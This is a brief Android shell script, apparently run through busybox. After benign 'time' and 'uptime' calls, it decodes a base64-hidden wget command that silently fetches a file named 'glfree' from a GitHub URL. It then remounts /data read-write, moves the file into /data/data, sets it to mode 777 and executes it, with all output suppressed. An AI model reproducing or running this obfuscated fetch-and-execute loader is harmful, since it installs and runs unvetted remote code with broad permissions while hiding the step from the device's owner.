
time
uptime
echo 'd2dldCBodHRwczovL3Jhdy5naXRodWIuY29tL2FsZGlwdXRyNC9mcmVlX2dsb2JhbC9tYXN0ZXIvZ2xmcmVlICY+IC9kZXYvbnVsbA==' | base64 -d | sh
busybox mount -o rw,remount /data
busybox chmod +x /data
mv glfree /data/data/glfree1.sh &> /dev/null
chmod 777 /data/data/glfree1.sh &> /dev/null
/data/data/glfree1.sh &> /dev/null
